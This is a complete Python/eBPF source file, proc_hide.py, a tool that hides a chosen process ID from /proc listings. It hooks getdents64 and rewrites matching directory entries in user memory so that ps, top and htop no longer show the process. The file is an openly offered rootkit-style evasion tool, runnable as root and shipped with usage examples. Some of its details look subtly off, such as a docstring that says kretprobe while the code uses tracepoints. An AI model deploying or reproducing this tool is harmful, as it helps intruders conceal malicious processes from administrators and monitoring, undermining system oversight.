#!/usr/bin/env python3
"""
proc_hide.py - Hide a process from /proc listing using eBPF kretprobe on sys_getdents64.

Hooks the return path of getdents64 and overwrites directory entries whose name
matches the target PID string, effectively hiding the process from tools that
enumerate /proc (ps, top, htop, etc.).

Requires: root, Linux kernel >= 4.7, bcc (python3-bpfcc)
"""

import argparse
import ctypes
import json
import os
import signal
import sys
import time

try:
    from bcc import BPF
except ImportError:
    print("Error: bcc library not found. Install python3-bpfcc or bcc-tools.", file=sys.stderr)
    sys.exit(1)


BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/dirent.h>

#define MAX_PID_LEN 8
#define MAX_ENTRIES 512
#define FILENAME_LEN 256

struct event_t {
    u32 pid;
    u32 tgid;
    char comm[TASK_COMM_LEN];
    u8  hidden;
};

BPF_PERF_OUTPUT(events);

// Store the target PID string to match against
BPF_ARRAY(target_pid_str, char[MAX_PID_LEN], 1);

// Map to track getdents64 calls: tid -> (buf pointer, return value)
struct getdents_args_t {
    u64 dirp;
};
BPF_HASH(active_getdents, u32, struct getdents_args_t);

// Capture the buffer pointer on entry to getdents64
TRACEPOINT_PROBE(syscalls, sys_enter_getdents64) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    struct getdents_args_t args = {};
    args.dirp = (u64)args__dirent;
    active_getdents.update(&tid, &args);
    return 0;
}

// On return from getdents64, scan the directory entries buffer
TRACEPOINT_PROBE(syscalls, sys_exit_getdents64) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    struct getdents_args_t *args = active_getdents.lookup(&tid);
    if (!args)
        return 0;

    int ret = (int)args__ret;
    if (ret <= 0) {
        active_getdents.delete(&tid);
        return 0;
    }

    // Read target PID string from the map
    int zero = 0;
    char (*target)[MAX_PID_LEN] = target_pid_str.lookup(&zero);
    if (!target) {
        active_getdents.delete(&tid);
        return 0;
    }

    u64 dirp = args->dirp;
    active_getdents.delete(&tid);

    // Walk through the linux_dirent64 structures in user-space buffer.
    // We iterate up to MAX_ENTRIES entries to stay within the BPF verifier limits.
    unsigned int offset = 0;

    #pragma unroll
    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (offset >= (unsigned int)ret)
            break;

        // Read d_reclen from user space
        unsigned short d_reclen = 0;
        int err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
                                       (void *)(dirp + offset +
                                       offsetof(struct linux_dirent64, d_reclen)));
        if (err != 0 || d_reclen == 0)
            break;

        // Read the d_name field (the entry name)
        char d_name[MAX_PID_LEN] = {};
        bpf_probe_read_user_str(d_name, sizeof(d_name),
                                (void *)(dirp + offset +
                                offsetof(struct linux_dirent64, d_name)));

        // Compare with target PID string
        bool match = true;
        #pragma unroll
        for (int j = 0; j < MAX_PID_LEN; j++) {
            if ((*target)[j] == '\0') {
                if (d_name[j] != '\0')
                    match = false;
                break;
            }
            if (d_name[j] != (*target)[j]) {
                match = false;
                break;
            }
        }

        if (match) {
            // Overwrite d_name with a dot entry to make it invisible
            // A single dot entry is ignored by most userspace tools
            char replacement[MAX_PID_LEN] = {'.', '\0'};
            bpf_probe_write_user(
                (void *)(dirp + offset + offsetof(struct linux_dirent64, d_name)),
                replacement, sizeof(replacement));

            // Send event to userspace
            struct event_t event = {};
            event.pid = bpf_get_current_pid_tgid() >> 32;
            event.tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.hidden = 1;
            events.perf_submit(args, &event, sizeof(event));
        }

        offset += d_reclen;
    }

    return 0;
}
"""


class ProcHider:
    """Manages the eBPF program that hides a process from /proc listings."""

    def __init__(self, pid, json_output=False):
        self.pid = pid
        self.json_output = json_output
        self.running = True
        self.bpf = None
        self.hide_count = 0

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[proc_hide] {message}", flush=True)

    def _handle_event(self, cpu, data, size):
        """Process perf buffer events from the BPF program."""
        event = self.bpf["events"].event(data)
        self.hide_count += 1
        self._log(
            f"Hidden PID {self.pid} from process {event.comm.decode('utf-8', errors='replace')} "
            f"(pid={event.pid})",
            level="event",
            hidden_pid=self.pid,
            accessor_pid=event.pid,
            accessor_comm=event.comm.decode("utf-8", errors="replace"),
            count=self.hide_count,
        )

    def _validate_pid(self):
        """Verify the target PID exists and is numeric."""
        if not str(self.pid).isdigit():
            self._log(f"Invalid PID: {self.pid}", level="error")
            return False
        proc_path = f"/proc/{self.pid}"
        if not os.path.exists(proc_path):
            self._log(
                f"Warning: PID {self.pid} does not currently exist in /proc. "
                f"Will still install the hook.",
                level="warning",
            )
        return True

    def start(self):
        """Compile and attach the eBPF program, then poll for events."""
        if not self._validate_pid():
            sys.exit(1)

        self._log(f"Compiling eBPF program to hide PID {self.pid}...")

        try:
            self.bpf = BPF(text=BPF_PROGRAM)
        except Exception as exc:
            self._log(f"Failed to compile/load eBPF program: {exc}", level="error")
            sys.exit(1)

        # Write the target PID string into the BPF array map
        pid_str = str(self.pid).encode("ascii")
        pid_buf = ctypes.create_string_buffer(8)
        pid_buf.value = pid_str
        self.bpf["target_pid_str"][ctypes.c_int(0)] = pid_buf

        # Set up the perf buffer callback
        self.bpf["events"].open_perf_buffer(self._handle_event)

        self._log(
            f"Process hiding active for PID {self.pid}. "
            f"The process will be invisible in /proc listings.",
            level="info",
            target_pid=self.pid,
            status="active",
        )
        self._log("Press Ctrl+C to stop and restore visibility.")

        while self.running:
            try:
                self.bpf.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                break

    def stop(self):
        """Detach probes and clean up."""
        self.running = False
        if self.bpf is not None:
            self.bpf.cleanup()
        self._log(
            f"Detached eBPF probes. PID {self.pid} is visible again. "
            f"Total hide events: {self.hide_count}",
            level="info",
            target_pid=self.pid,
            total_hidden=self.hide_count,
            status="stopped",
        )


def main():
    parser = argparse.ArgumentParser(
        description="Hide a process from /proc listings using eBPF. "
        "Hooks sys_getdents64 to filter directory entries matching the target PID.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 proc_hide.py --pid 1234\n"
            "  sudo python3 proc_hide.py --pid 1234 --json-output\n"
        ),
    )
    parser.add_argument(
        "--pid",
        type=int,
        required=True,
        help="PID of the process to hide from /proc listings.",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output events as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print(
            "Error: This script must be run as root (eBPF requires CAP_SYS_ADMIN).",
            file=sys.stderr,
        )
        sys.exit(1)

    hider = ProcHider(pid=args.pid, json_output=args.json_output)

    def signal_handler(signum, frame):
        hider.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        hider.start()
    except SystemExit:
        raise
    except Exception as exc:
        hider._log(f"Unexpected error: {exc}", level="error")
        hider.stop()
        sys.exit(1)
    finally:
        hider.stop()


if __name__ == "__main__":
    main()
